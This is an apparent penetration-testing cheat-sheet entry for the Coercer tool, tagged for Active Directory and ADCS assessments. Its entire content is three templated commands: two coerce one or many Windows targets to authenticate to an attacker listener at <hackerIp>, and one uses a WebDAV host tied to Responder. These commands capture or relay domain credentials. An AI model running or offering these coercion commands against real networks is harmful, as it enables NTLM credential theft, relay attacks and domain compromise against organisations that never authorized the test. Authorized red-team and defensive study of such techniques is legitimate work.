# coercer

% adcs, certificate, windows, Active directory, template

## List vulns
#assessment/AD #target/remote #cat/RECON
```bash
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> <targetIp> 
```

## Webdav
#assessment/AD #target/remote #cat/RECON
```bash
coercer.py -d '<domain>' -u '<user>' -p '<password>' --webdav-host '<ResponderMachineName>' <targetIp> 
```

## List vulns many targets
#assessment/AD #target/remote #cat/RECON
```bash
coercer.py -d '<domain>' -u '<user>' -p '<password>' --listener <hackerIp> --targets-file <PathToTargetFile> 
```
